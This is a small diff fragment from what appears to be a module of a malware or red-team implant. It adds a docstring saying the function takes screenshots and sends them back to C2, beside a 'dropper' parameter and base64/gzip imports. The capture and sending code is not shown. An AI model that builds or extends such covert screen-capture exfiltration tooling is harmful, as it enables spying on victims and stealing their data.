@@ -6,6 +6,8 @@ from gzip import compress as gzipup
 from base64 import b64encode
 
 def main(dropper, args=None):
+    """Take screenshots and send back to C2"""
+    
     print("DEBUG - taking screenshot.")
     #Get screenshot
     try:
